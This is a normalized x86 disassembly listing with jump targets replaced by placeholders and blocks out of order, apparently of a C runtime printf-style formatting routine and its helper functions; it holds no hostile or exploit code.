jg r-xdata
or ebx 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
mov edi [ ebp - 0x210 ]
cmp [ edi + 0x1 ] 0x32
jne r-xdata
mov eax edi
add eax 0x2
or ebx 0x8000
jmp r-xdata
cmp [ eax ] 0x6c
jne r-xdata
cmp dl 0x77
jne r-xdata
mov edx [ ebp - 0x228 ]
mov ecx 0x7fffffff
cmp edx 0xffffffff
je r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x228 ] 0x8
cmp eax 0x65
jl r-xdata
mov ecx [ edi ]
add edi 0x8
mov [ ebp - 0x21c ] edi
xor esi esi
mov edi [ edi - 0x4 ]
jmp r-xdata
test ebx 0x1000
je r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or ebx 0x4
sub eax 0x3
mov eax [ ebp - 0x210 ]
jne r-xdata
cmp al 0x69
je r-xdata
mov eax edi
add eax 0x2
and ebx 0xffff7fff
jmp r-xdata
mov [ ebp - 0x218 ] ebx
jmp r-xdata
or ebx 0x10
jmp r-xdata
inc eax
or ebx 0x1000
jmp r-xdata
or ebx 0x800
jmp r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x21c ] edi
test ebx 0x810
je r-xdata
mov ecx edx
mov [ ebp - 0x224 ] 0xa
sub eax 0x3
jne r-xdata
mov [ ebp - 0x224 ] 0x10
pop eax
mov [ ebp - 0x254 ] eax
test bl bl
jns r-xdata
cmp [ ebp - 0x24c ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
test bl 0x40
je r-xdata
add edi 0x4
xor esi esi
mov [ ebp - 0x21c ] edi
test bl 0x20
je r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
test ebx 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or ebx 0x8
cmp al 0x6f
je r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
push 0x27
test ebx 0x8000
jne r-xdata
add al 0x51
mov [ ebp - 0x22c ] 0x30
mov [ ebp - 0x22b ] al
mov [ ebp - 0x234 ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x220 ]
test bl 0x40
je r-xdata
mov eax [ ebp - 0x228 ]
lea esi [ ebp - 0x20c ]
or ebx 0x40
mov ecx 0x200
mov [ ebp - 0x218 ] ebx
mov [ ebp - 0x23c ] ecx
test eax eax
jns r-xdata
cmp eax 0x69
je r-xdata
test ebx 0x9000
jne r-xdata
cmp edi esi
jg r-xdata
test bl 0x40
je r-xdata
test bl 0x40
je r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x21c ] edi
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
or ebx 0x800
mov [ ebp - 0x218 ] ebx
add dl 0x20
mov [ ebp - 0x25c ] 0x1
mov [ ebp - 0x211 ] dl
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
mov eax esi
jmp r-xdata
mov esi [ rw-data ]
mov [ ebp - 0x238 ] 0x1
mov eax esi
test ecx ecx
je r-xdata
mov esi [ rw-data ]
push eax
call sub_1003f3e3
xor eax eax
pop ecx
mov [ ebp - 0x250 ] eax
mov edi [ ebp - 0x240 ]
sub edi [ ebp - 0x224 ]
mov eax [ ebp - 0x234 ]
sub edi eax
test bl 0xc
jne r-xdata
test ebx 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x228 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
mov edx [ ebp - 0x228 ]
test edx edx
jns r-xdata
mov edi esi
jl r-xdata
mov ecx [ edi - 0x4 ]
mov edi esi
mov eax [ edi - 0x4 ]
movzx eax [ edi - 0x4 ]
jmp r-xdata
movsx eax [ edi - 0x4 ]
jmp r-xdata
mov esi [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
dec eax
dec eax
jne r-xdata
test ebx 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
test ecx ecx
jne r-xdata
sub eax esi
sar eax 0x1
jmp r-xdata
xor edx edx
push [ ebp - 0x258 ]
lea ecx [ ebp - 0x220 ]
push ecx
push [ ebp - 0x230 ]
push eax
lea eax [ ebp - 0x22c ]
push eax
call sub_10040b32
add esp 0x14
test bl 0x8
je r-xdata
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
push edi
push 0x20
call sub_1004178e
mov eax [ ebp - 0x234 ]
add esp 0x10
test bl 0x1
je r-xdata
mov [ ebp - 0x22c ] 0x2d
jmp r-xdata
cmp eax ecx
jle r-xdata
cmp dl 0x67
jne r-xdata
mov eax [ edi ]
add edi 0x8
mov [ ebp - 0x278 ] eax
mov [ ebp - 0x21c ] edi
mov eax [ edi - 0x4 ]
mov [ ebp - 0x274 ] eax
lea eax [ ebp - 0x270 ]
push eax
push [ ebp - 0x25c ]
movsx eax dl
push [ ebp - 0x228 ]
push eax
push [ ebp - 0x23c ]
lea eax [ ebp - 0x278 ]
push esi
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
mov edi ebx
add esp 0x1c
and edi 0x80
je r-xdata
add edi 0x4
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
call sub_10046c92
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
and ebx 0xfffffff7
mov eax 0x200
mov [ ebp - 0x218 ] ebx
cmp edx eax
jle r-xdata
xor edx edx
inc edx
jmp r-xdata
neg ecx
adc edi esi
neg edi
or ebx 0x100
mov [ ebp - 0x218 ] ebx
cmp ecx esi
jae r-xdata
cdq
mov ecx eax
mov edi edx
jmp r-xdata
mov [ ebp - 0x224 ] eax
movsx eax [ eax ]
test ebx 0x800
je r-xdata
add edi 0x4
mov [ ebp - 0x21c ] edi
test ebx 0x810
je r-xdata
or ebx 0x800
mov [ ebp - 0x218 ] ebx
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp al 0x58
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax esi
add eax 0x2
test ecx ecx
jne r-xdata
cmp [ ebp - 0x238 ] 0x0
mov eax [ ebp - 0x224 ]
je r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
mov [ ebp - 0x22c ] 0x2b
jmp r-xdata
mov [ ebp - 0x234 ] 0x1
cmp eax 0xa3
jle r-xdata
mov eax ecx
mov [ ebp - 0x228 ] eax
mov [ ebp - 0x228 ] 0x1
jmp r-xdata
cmp [ ebp - 0x211 ] 0x67
jne r-xdata
cmp [ ebp - 0x228 ] 0x0
jne r-xdata
mov eax [ ebp - 0x220 ]
test bl 0x20
je r-xdata
mov [ ebp - 0x224 ] 0x8
test bl bl
jns r-xdata
mov eax ecx
or eax edi
jne r-xdata
mov edx eax
xor ecx ecx
mov [ ebp - 0x238 ] ecx
jmp r-xdata
cdq
sub eax edx
mov [ ebp - 0x238 ] 0x1
sar eax 0x1
jmp r-xdata
mov al [ edi - 0x4 ]
mov [ ebp - 0x20c ] al
mov [ ebp - 0x224 ] 0x1
movzx eax [ edi - 0x4 ]
push eax
push 0x200
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x224 ]
push eax
call sub_10046dcb
add esp 0x10
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x244 ] eax
jmp r-xdata
inc eax
dec ecx
cmp [ eax ] dx
je r-xdata
push [ ebp - 0x258 ]
lea ecx [ ebp - 0x220 ]
push ecx
push [ ebp - 0x230 ]
push eax
push esi
call sub_10040b32
add esp 0x14
test eax eax
jle r-xdata
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
push edi
push 0x30
call sub_1004178e
add esp 0x10
mov [ ebp - 0x22c ] 0x20
lea edi [ eax + 0x15d ]
push edi
call sub_1003f0e4
mov dl [ ebp - 0x211 ]
mov [ ebp - 0x250 ] eax
pop ecx
test eax eax
je r-xdata
cmp [ esi ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x270 ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov [ edi ] eax
mov [ edi ] ax
jmp r-xdata
or ebx 0x200
mov [ ebp - 0x218 ] ebx
jmp r-xdata
lea esi [ ebp - 0xd ]
mov [ ebp - 0x234 ] esi
lea esi [ ebp - 0x20c ]
jmp r-xdata
mov [ ebp - 0x24c ] 0x1
jmp r-xdata
mov [ ebp - 0x238 ] eax
lea eax [ ebp - 0x270 ]
push eax
movzx eax dl
push eax
call sub_10046c47
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x250 ]
test eax eax
je r-xdata
test bl 0x4
je r-xdata
mov ecx esi
mov [ ebp - 0x228 ] 0xa3
mov esi eax
mov [ ebp - 0x23c ] edi
jmp r-xdata
push esi
call sub_1003e2d0
pop ecx
jmp r-xdata
or ebx 0x100
inc esi
mov [ ebp - 0x218 ] ebx
jmp r-xdata
lea eax [ ebp - 0x270 ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov [ ebp - 0x24c ] 0x1
jmp r-xdata
mov eax [ ebp - 0x224 ]
cdq
push edx
push eax
push edi
push ecx
call sub_10046df0
add ecx 0x30
mov [ ebp - 0x27c ] ebx
mov [ ebp - 0x23c ] eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ecx
or eax edi
je r-xdata
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
push edi
push 0x20
call sub_1004178e
add esp 0x10
or ecx 0xffffffff
mov [ ebp - 0x220 ] ecx
jmp r-xdata
cmp [ ebp - 0x260 ] eax
je r-xdata
mov edi [ ebp - 0x21c ]
mov edx [ ebp - 0x228 ]
mov [ esi ] cl
dec esi
mov ecx [ ebp - 0x23c ]
jmp r-xdata
add ecx [ ebp - 0x254 ]
mov ebx [ ebp - 0x218 ]
lea eax [ ebp - 0xd ]
sub eax esi
inc esi
mov [ ebp - 0x224 ] eax
test ebx 0x200
je r-xdata
test ecx ecx
js r-xdata
push [ ebp - 0x258 ]
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
lea eax [ ebp - 0xc ]
push [ ebp - 0x260 ]
push eax
call sub_10040b32
mov eax [ ebp - 0x23c ]
add esp 0x14
mov ecx [ ebp - 0x27c ]
test eax eax
jne r-xdata
mov eax edx
dec edx
mov [ ebp - 0x228 ] edx
test eax eax
jg r-xdata
test eax eax
je r-xdata
dec eax
mov [ ebp - 0x23c ] eax
movzx eax [ ecx ]
add ecx 0x2
push eax
push 0x6
lea eax [ ebp - 0xc ]
mov [ ebp - 0x27c ] ecx
push eax
lea eax [ ebp - 0x260 ]
push eax
call sub_10046dcb
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
dec esi
inc [ ebp - 0x224 ]
mov [ esi ] 0x30
jmp r-xdata
cmp [ esi ] 0x30
je r-xdata
mov ecx [ ebp - 0x220 ]
sub_10040b32
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x10 ]
mov eax [ esi ]
mov [ ebp + 0x18 ] eax
test [ edi + 0xc ] 0x40
je r-xdata
and [ esi ] 0x0
push ebx
mov ebx [ ebp + 0xc ]
test ebx ebx
jle r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov [ esi ] eax
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
add [ ecx ] eax
jmp r-xdata
test ebx ebx
jg r-xdata
cmp [ esi ] 0x2a
jne r-xdata
pop edi
pop esi
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
dec ebx
push edi
movzx eax [ eax ]
push eax
call sub_10041746
mov eax [ ebp + 0x14 ]
add esp 0xc
inc [ ebp + 0x8 ]
cmp [ eax ] 0xffffffff
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
push eax
push edi
push 0x3f
call sub_10041746
mov eax [ ebp + 0x14 ]
add esp 0xc
pop ebx
mov eax [ ebp + 0x18 ]
sub_10040baa
push ebp
mov ebp esp
sub esp 0x280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x270 ]
push ebx
push esi
mov [ ebp - 0x230 ] eax
mov eax [ ebp + 0xc ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x210 ] eax
xor eax eax
mov ebx eax
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x254 ] eax
mov esi eax
mov [ ebp - 0x218 ] ebx
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x224 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x250 ] eax
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x244 ] eax
call sub_1003cf9b
call sub_100417ee
mov [ ebp - 0x25c ] eax
mov eax [ ebp - 0x230 ]
test eax eax
je r-xdata
call sub_100417ee
mov [ eax ] 0x16
call sub_1003fe28
or eax 0xffffffff
jmp r-xdata
test [ eax + 0xc ] 0x40
jne r-xdata
cmp [ ebp - 0x264 ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
mov edx [ ebp - 0x210 ]
test edx edx
je r-xdata
push eax
call sub_100460c6
pop ecx
mov ecx eax
cmp ecx 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x268 ]
and [ ecx + 0x70 ] 0xfffffffd
mov dl [ edx ]
xor eax eax
mov [ ebp - 0x228 ] eax
mov ecx eax
mov [ ebp - 0x220 ] ecx
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x258 ] eax
mov [ ebp - 0x211 ] dl
mov [ ebp - 0x24c ] dl
test dl dl
je r-xdata
mov edx rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax ecx
mov eax [ ebp - 0x210 ]
cmp ecx 0xffffffff
je r-xdata
mov edx ecx
sar eax 0x5
and edx 0x1f
shl edx 0x6
add edx [ eax * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x238 ]
test eax eax
je r-xdata
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov ecx rw-data
cmp ecx 0xfffffffe
je r-xdata
test [ edx + 0x24 ] 0x7f
jne r-xdata
cmp eax 0x7
je r-xdata
xor eax eax
movsx eax dl
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov eax ecx
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
add ecx [ eax * 4 + rw-data ]
jmp r-xdata
cmp eax 0x7
ja r-xdata
mov edi [ ebp - 0x238 ]
imul eax eax 0x9
movzx edi [ eax + edi + r--data ]
mov eax edi
mov [ ebp - 0x238 ] edi
mov edi [ ebp - 0x21c ]
shr eax 0x4
mov [ ebp - 0x238 ] eax
cmp eax 0x8
je r-xdata
test [ ecx + 0x24 ] 0x80
jne r-xdata
mov eax [ ebp - 0x210 ]
jmp [ eax * 4 + jump_table_10041726 ]
inc eax
mov [ ebp - 0x210 ] eax
test ecx ecx
js r-xdata
xor eax eax
or [ ebp - 0x224 ] 0xffffffff
mov ebx eax
mov [ ebp - 0x250 ] eax
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] ebx
mov [ ebp - 0x244 ] eax
jmp r-xdata
movsx eax dl
sub eax 0x20
je r-xdata
cmp dl 0x2a
jne r-xdata
xor eax eax
mov [ ebp - 0x224 ] eax
jmp r-xdata
cmp dl 0x2a
jne r-xdata
cmp dl 0x49
je r-xdata
xor eax eax
movsx eax dl
cmp eax 0x64
jg r-xdata
or ebx 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
imul ecx [ ebp - 0x240 ] 0xa
movsx eax dl
add ecx 0xffffffd0
add eax ecx
mov [ ebp - 0x240 ] eax
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x240 ] eax
test eax eax
jns r-xdata
imul ecx [ ebp - 0x224 ] 0xa
movsx eax dl
add ecx 0xffffffd0
add eax ecx
mov [ ebp - 0x224 ] eax
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x224 ] eax
test eax eax
mov eax [ ebp - 0x210 ]
mov [ ebp - 0x21c ] edi
jns r-xdata
mov eax [ ebp - 0x210 ]
mov al [ eax ]
cmp al 0x36
jne r-xdata
cmp dl 0x68
je r-xdata
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
push [ ebp - 0x24c ]
call sub_10041746
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
push [ ebp - 0x24c ]
call sub_10041746
mov ecx [ ebp - 0x210 ]
add esp 0xc
mov al [ ecx ]
inc ecx
mov [ ebp - 0x24c ] al
mov [ ebp - 0x210 ] ecx
test al al
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
mov [ ebp - 0x218 ] ebx
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
mov ecx [ ebp - 0x220 ]
or ebx 0x4
neg eax
mov [ ebp - 0x218 ] ebx
mov [ ebp - 0x240 ] eax
jmp r-xdata
mov dl [ eax ]
mov [ ebp - 0x211 ] dl
mov [ ebp - 0x24c ] dl
test dl dl
jne r-xdata
or [ ebp - 0x224 ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
mov edi [ ebp - 0x210 ]
cmp [ edi + 0x1 ] 0x34
jne r-xdata
or ebx 0x20
jmp r-xdata
mov eax [ ebp - 0x210 ]
cmp dl 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or ebx 0x40
mov [ ebp - 0x218 ] ebx
cmp eax 0x53
jg r-xdata
or ebx 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
mov edi [ ebp - 0x210 ]
cmp [ edi + 0x1 ] 0x32
jne r-xdata
mov eax edi
add eax 0x2
or ebx 0x8000
jmp r-xdata
cmp [ eax ] 0x6c
jne r-xdata
cmp dl 0x77
jne r-xdata
mov edx [ ebp - 0x224 ]
mov ecx 0x7fffffff
cmp edx 0xffffffff
je r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x224 ] 0x8
cmp eax 0x65
jl r-xdata
mov ecx [ edi ]
add edi 0x8
mov [ ebp - 0x21c ] edi
xor esi esi
mov edi [ edi - 0x4 ]
jmp r-xdata
test ebx 0x1000
je r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or ebx 0x4
sub eax 0x3
mov eax [ ebp - 0x210 ]
jne r-xdata
cmp al 0x69
je r-xdata
mov eax edi
add eax 0x2
and ebx 0xffff7fff
jmp r-xdata
mov [ ebp - 0x218 ] ebx
jmp r-xdata
or ebx 0x10
jmp r-xdata
inc eax
or ebx 0x1000
jmp r-xdata
or ebx 0x800
jmp r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x21c ] edi
test ebx 0x810
je r-xdata
mov ecx edx
mov [ ebp - 0x228 ] 0xa
sub eax 0x3
jne r-xdata
mov [ ebp - 0x228 ] 0x10
pop eax
mov [ ebp - 0x254 ] eax
test bl bl
jns r-xdata
cmp [ ebp - 0x248 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
test bl 0x40
je r-xdata
add edi 0x4
xor esi esi
mov [ ebp - 0x21c ] edi
test bl 0x20
je r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
test ebx 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or ebx 0x8
cmp al 0x6f
je r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
push 0x27
test ebx 0x8000
jne r-xdata
add al 0x51
mov [ ebp - 0x22c ] 0x30
mov [ ebp - 0x22b ] al
mov [ ebp - 0x234 ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x220 ]
test bl 0x40
je r-xdata
mov eax [ ebp - 0x224 ]
lea esi [ ebp - 0x20c ]
or ebx 0x40
mov ecx 0x200
mov [ ebp - 0x218 ] ebx
mov [ ebp - 0x23c ] ecx
test eax eax
jns r-xdata
cmp eax 0x69
je r-xdata
test ebx 0x9000
jne r-xdata
cmp edi esi
jg r-xdata
test bl 0x40
je r-xdata
test bl 0x40
je r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x21c ] edi
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
or ebx 0x800
mov [ ebp - 0x218 ] ebx
add dl 0x20
mov [ ebp - 0x250 ] 0x1
mov [ ebp - 0x211 ] dl
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
mov eax esi
jmp r-xdata
mov esi [ rw-data ]
mov [ ebp - 0x244 ] 0x1
mov eax esi
test ecx ecx
je r-xdata
mov esi [ rw-data ]
push eax
call sub_1003f3e3
xor eax eax
pop ecx
mov [ ebp - 0x258 ] eax
mov edi [ ebp - 0x240 ]
sub edi [ ebp - 0x228 ]
mov eax [ ebp - 0x234 ]
sub edi eax
test bl 0xc
jne r-xdata
test ebx 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x224 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
mov edx [ ebp - 0x224 ]
test edx edx
jns r-xdata
mov edi esi
jl r-xdata
mov ecx [ edi - 0x4 ]
mov edi esi
mov eax [ edi - 0x4 ]
movzx eax [ edi - 0x4 ]
jmp r-xdata
movsx eax [ edi - 0x4 ]
jmp r-xdata
mov esi [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
dec eax
dec eax
jne r-xdata
test ebx 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
test ecx ecx
jne r-xdata
sub eax esi
sar eax 0x1
jmp r-xdata
xor edx edx
push [ ebp - 0x25c ]
lea ecx [ ebp - 0x220 ]
push ecx
push [ ebp - 0x230 ]
push eax
lea eax [ ebp - 0x22c ]
push eax
call sub_10040b32
add esp 0x14
test bl 0x8
je r-xdata
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
push edi
push 0x20
call sub_1004178e
mov eax [ ebp - 0x234 ]
add esp 0x10
test bl 0x1
je r-xdata
mov [ ebp - 0x22c ] 0x2d
jmp r-xdata
cmp eax ecx
jle r-xdata
cmp dl 0x67
jne r-xdata
mov eax [ edi ]
add edi 0x8
mov [ ebp - 0x280 ] eax
mov [ ebp - 0x21c ] edi
mov eax [ edi - 0x4 ]
mov [ ebp - 0x27c ] eax
lea eax [ ebp - 0x270 ]
push eax
push [ ebp - 0x250 ]
movsx eax dl
push [ ebp - 0x224 ]
push eax
push [ ebp - 0x23c ]
lea eax [ ebp - 0x280 ]
push esi
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
mov edi ebx
add esp 0x1c
and edi 0x80
je r-xdata
add edi 0x4
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
call sub_10046c92
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
and ebx 0xfffffff7
mov eax 0x200
mov [ ebp - 0x218 ] ebx
cmp edx eax
jle r-xdata
xor edx edx
inc edx
jmp r-xdata
neg ecx
adc edi esi
neg edi
or ebx 0x100
mov [ ebp - 0x218 ] ebx
cmp ecx esi
jae r-xdata
cdq
mov ecx eax
mov edi edx
jmp r-xdata
mov [ ebp - 0x228 ] eax
movsx eax [ eax ]
test ebx 0x800
je r-xdata
add edi 0x4
mov [ ebp - 0x21c ] edi
test ebx 0x810
je r-xdata
or ebx 0x800
mov [ ebp - 0x218 ] ebx
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp al 0x58
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax esi
add eax 0x2
test ecx ecx
jne r-xdata
cmp [ ebp - 0x244 ] 0x0
mov eax [ ebp - 0x228 ]
je r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
mov [ ebp - 0x22c ] 0x2b
jmp r-xdata
mov [ ebp - 0x234 ] 0x1
cmp eax 0xa3
jle r-xdata
mov eax ecx
mov [ ebp - 0x224 ] eax
mov [ ebp - 0x224 ] 0x1
jmp r-xdata
cmp [ ebp - 0x211 ] 0x67
jne r-xdata
cmp [ ebp - 0x224 ] 0x0
jne r-xdata
mov eax [ ebp - 0x220 ]
test bl 0x20
je r-xdata
mov [ ebp - 0x228 ] 0x8
test bl bl
jns r-xdata
mov eax ecx
or eax edi
jne r-xdata
mov edx eax
xor ecx ecx
mov [ ebp - 0x244 ] ecx
jmp r-xdata
cdq
sub eax edx
mov [ ebp - 0x244 ] 0x1
sar eax 0x1
jmp r-xdata
mov al [ edi - 0x4 ]
mov [ ebp - 0x20c ] al
mov [ ebp - 0x228 ] 0x1
movzx eax [ edi - 0x4 ]
push eax
push 0x200
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x228 ]
push eax
call sub_10046dcb
add esp 0x10
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x238 ] eax
jmp r-xdata
inc eax
dec ecx
cmp [ eax ] dx
je r-xdata
push [ ebp - 0x25c ]
lea ecx [ ebp - 0x220 ]
push ecx
push [ ebp - 0x230 ]
push eax
push esi
call sub_10040b32
add esp 0x14
test eax eax
jle r-xdata
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
push edi
push 0x30
call sub_1004178e
add esp 0x10
mov [ ebp - 0x22c ] 0x20
lea edi [ eax + 0x15d ]
push edi
call sub_1003f0e4
mov dl [ ebp - 0x211 ]
mov [ ebp - 0x258 ] eax
pop ecx
test eax eax
je r-xdata
cmp [ esi ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x270 ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov [ edi ] eax
mov [ edi ] ax
jmp r-xdata
or ebx 0x200
mov [ ebp - 0x218 ] ebx
jmp r-xdata
lea esi [ ebp - 0xd ]
mov [ ebp - 0x234 ] esi
lea esi [ ebp - 0x20c ]
jmp r-xdata
mov [ ebp - 0x248 ] 0x1
jmp r-xdata
mov [ ebp - 0x244 ] eax
lea eax [ ebp - 0x270 ]
push eax
movzx eax dl
push eax
call sub_10046c47
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x258 ]
test eax eax
je r-xdata
test bl 0x4
je r-xdata
mov ecx esi
mov [ ebp - 0x224 ] 0xa3
mov esi eax
mov [ ebp - 0x23c ] edi
jmp r-xdata
push esi
call sub_1003e2d0
pop ecx
jmp r-xdata
or ebx 0x100
inc esi
mov [ ebp - 0x218 ] ebx
jmp r-xdata
lea eax [ ebp - 0x270 ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov [ ebp - 0x248 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x228 ]
cdq
push edx
push eax
push edi
push ecx
call sub_10046df0
add ecx 0x30
mov [ ebp - 0x274 ] ebx
mov [ ebp - 0x23c ] eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ecx
or eax edi
je r-xdata
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
push edi
push 0x20
call sub_1004178e
add esp 0x10
or ecx 0xffffffff
mov [ ebp - 0x220 ] ecx
jmp r-xdata
cmp [ ebp - 0x260 ] eax
je r-xdata
mov edi [ ebp - 0x21c ]
mov edx [ ebp - 0x224 ]
mov [ esi ] cl
dec esi
mov ecx [ ebp - 0x23c ]
jmp r-xdata
add ecx [ ebp - 0x254 ]
mov ebx [ ebp - 0x218 ]
lea eax [ ebp - 0xd ]
sub eax esi
inc esi
mov [ ebp - 0x228 ] eax
test ebx 0x200
je r-xdata
test ecx ecx
js r-xdata
push [ ebp - 0x25c ]
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
lea eax [ ebp - 0xc ]
push [ ebp - 0x260 ]
push eax
call sub_10040b32
mov eax [ ebp - 0x23c ]
add esp 0x14
mov ecx [ ebp - 0x274 ]
test eax eax
jne r-xdata
mov eax edx
dec edx
mov [ ebp - 0x224 ] edx
test eax eax
jg r-xdata
test eax eax
je r-xdata
dec eax
mov [ ebp - 0x23c ] eax
movzx eax [ ecx ]
add ecx 0x2
push eax
push 0x6
lea eax [ ebp - 0xc ]
mov [ ebp - 0x274 ] ecx
push eax
lea eax [ ebp - 0x260 ]
push eax
call sub_10046dcb
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
dec esi
inc [ ebp - 0x228 ]
mov [ esi ] 0x30
jmp r-xdata
cmp [ esi ] 0x30
je r-xdata
mov ecx [ ebp - 0x220 ]
sub_10041746
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
test [ edx + 0xc ] 0x40
je r-xdata
dec [ edx + 0x4 ]
js r-xdata
cmp [ edx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push edx
movsx eax al
push eax
call sub_1003fe63
pop ecx
pop ecx
mov eax [ edx ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
inc [ edx ]
movzx eax cl
jmp r-xdata
mov eax [ ebp + 0x10 ]
inc [ eax ]
pop ebp
retn
mov eax [ ebp + 0x10 ]
or [ eax ] 0xffffffff
pop ebp
retn
cmp eax 0xffffffff
jne r-xdata
sub_1004178e
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test esi esi
jle r-xdata
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0x14 ]
pop edi
test esi esi
jg r-xdata
push edi
push [ ebp + 0x10 ]
dec esi
push [ ebp + 0x8 ]
